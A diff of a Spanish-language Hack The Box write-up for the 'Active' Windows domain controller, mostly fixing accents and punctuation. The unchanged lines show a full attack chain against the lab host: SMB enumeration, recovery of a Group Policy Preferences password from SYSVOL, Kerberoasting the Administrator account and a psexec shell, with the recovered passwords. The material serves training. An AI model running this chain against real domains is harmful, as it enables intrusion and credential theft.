@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Active - Hack The Box
-excerpt: "Esta maquina tiene una dificultad en Hack The Box de Easy. Es una maquina Windows, domain controler bastante interesante, asi que vamos a ello"
+excerpt: "Ésta máquina tiene una dificultad en Hack The Box de Easy. Es una máquina Windows, domain controler, bastante facililla, así que vamos a ello"
 date: 2021-9-19
 classes: wide
 header:
@@ -90,9 +90,7 @@ PORT      STATE SERVICE
 
 ```
 
-Bueno hay un monton de puertos abiertos.
-
-Vamos a extraer los puertos con la utilidad que tengo previamente definida en la `.zshrc`. Dicha utilidad esta creada por s4vitar
+Bueno hay un monton de puertos abiertos, por lo que vamos a extraer los puertos con la utilidad que tengo previamente definida en la `.zshrc`. Dicha utilidad está creada por s4vitar
 
 ```bash
 h3g0c1v@kali:~/htb/active$ extractPorts allPorts
@@ -110,7 +108,7 @@ h3g0c1v@kali:~/htb/active$ extractPorts allPorts
 ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-Perfecto ahora vamos a ver la version y servicio que corren bajo los **puertos abiertos**, y el output lo redigiremos al archivo `targeted`.
+Perfecto ahora vamos a ver la versión y servicio que corren bajo los **puertos abiertos**, y el output lo redigiremos al archivo `targeted`.
 
 ```bash
 h3g0c1v@kali:~/htb/active$ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49172,49182 10.10.10.100 -oN targeted  
@@ -160,7 +158,7 @@ Host script results:
 
 ```
 
-Bien como veo que el puerto **88** esta abierto, voy a ver con **crackmapexec** a ver que nos dice.
+Bien como veo que el puerto **88** está abierto, voy a ver con **crackmapexec** a ver que nos dice.
 
 ```bash
 h3g0c1v@kali:~/htb/active$ crackmapexec smb 10.10.10.100                                         
@@ -168,7 +166,7 @@ SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x
 
 ```
 
-Y vemos que es un **Domain Controler** , y que hay un, dominio por lo que vamos a meterlo en el `/etc/hosts` , por si acaso se esta utilizando **Virtual Hosting**.
+Y vemos que es un **Domain Controler** , y que hay un, dominio por lo que vamos a meterlo en el `/etc/hosts` , por si acaso se está utilizando **Virtual Hosting**.
 
 ```bash
 h3g0c1v@kali:~/htb/active$ cat /etc/hosts                                         
@@ -241,7 +239,7 @@ h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -r Replication
 
 ```
 
-Vemos un directorio `active.htb` asi que vamos a meternos dentro a ver que hay. 
+Vemos un directorio `active.htb` , así que vamos a meternos dentro a ver que hay. 
 
 ```bash
 h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -r Replication/active.htb
@@ -259,7 +257,9 @@ h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -r Replication/active.htb
 
 ```
 
-Ahora se pone mas interesante. Esta estructura de archivos se parece a un **sysvol** ,  por lo que hay que buscar un archivo `groups.xml`, porque ahi suelen haber credenciales **hasheadas**. Vamos a ver si lo hay.
+Ahora se pone mas interesante. 
+
+Ésta estructura de archivos se parece a un **sysvol** ,  por lo que hay que buscar un archivo `groups.xml`, porque ahí se suelen almacenar credenciales **hasheadas**. Vamos a ver si lo hay.
 
 ```bash
 h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
@@ -307,7 +307,7 @@ GPPstillStandingStrong2k18
 
 ```
 
-Perfecto tenemos una **contraseña valida** del **usuario SVC_TGS** , asi que vamos a validar si esa contraseña tiene permisos de **administrador** , con **crackmapexec**.
+Perfecto, tenemos una **contraseña válida** y el **usuario SVC_TGS** , así que vamos a validar si esa contraseña tiene permisos de **administrador** , con **crackmapexec**.
 
 ```bash
 h3g0c1v@kali:~/htb/active$ crackmapexec smb 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18"
@@ -316,7 +316,7 @@ SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPst
 
 ```
 
-Y no es valida. Bueno pues vamos a ver ahora, otra vez, los recursos compartidos a nivel de red con las credenciales encontradas, a ver si tenemos algun permiso nuevo para algun recurso.
+Y no es válida. Bueno pues vamos a ver ahora, otra vez, los recursos compartidos a nivel de red con las credenciales encontradas, a ver si tenemos algún permiso nuevo para algún recurso.
 
 ```bash
 h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18"
@@ -333,7 +333,7 @@ h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -u "SVC_TGS" -p "GPPstillStand
 
 ```
 
-Genial, tenemos mas permisos, asi que vamos a ver el recuso **Users** , que quiero saber si hay algun que otro usuario que no sepamos.
+Genial, tenemos mas permisos, así que vamos a ver el recuso **Users** , que quiero saber si hay algun que otro usuario que no sepamos.
 
 ```bash
 h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18" -r Users
@@ -356,7 +356,7 @@ h3g0c1v@kali:~/htb/active$ smbmap -H 10.10.10.100 -u "SVC_TGS" -p "GPPstillStand
 
 Y solo hay un solo usuario.
 
-# Conseguimos Acceso a la Maquina
+# Conseguimos Acceso a la Máquina
 
 Bien, ahora vamos a ver si hay algun usuario **kerberoasteable** , con la utilidad **GetUserSPNs.py**. 
 
@@ -370,7 +370,7 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 
 ```
 
-Perfecto, pues ahora podemos utilizar la utilildad **GetUserSPNs.py** , para obtener el ticket `TGT` del usuario administrador, para luego crackearlo con **jhon**.
+Perfecto, pues ahora podemos utilizar la utilildad **GetUserSPNs.py** , para obtener el ticket `TGT` del usuario administrador, para luego **crackearlo** con **jhon**.
 
 ![](/assets/images/htb-writeup-active/TGT.png)
 
@@ -387,7 +387,7 @@ SMB         10.10.10.100    445    DC               [+] active.htb\Administrator
 
 ```
 
-Genial! Ahora vamos a poder ganar acceso al sistema, con la utilidad **psexec**
+¡Genial! Ahora vamos a poder ganar acceso al sistema, con la utilidad **psexec** .
 
 ```bash
 h3g0c1v@kali:~/htb/active$ python3 /usr/share/doc/python3-impacket/examples/psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe 
@@ -412,7 +412,7 @@ C:\Windows\system32>
 Ahora podemos visualizar las dos flags, tanto la `user.txt` como la `root.txt`.
 
 
-Asi que primero vamos a ver la `user.txt`.
+Así que primero vamos a ver la `user.txt`.
 
 ```bash
 
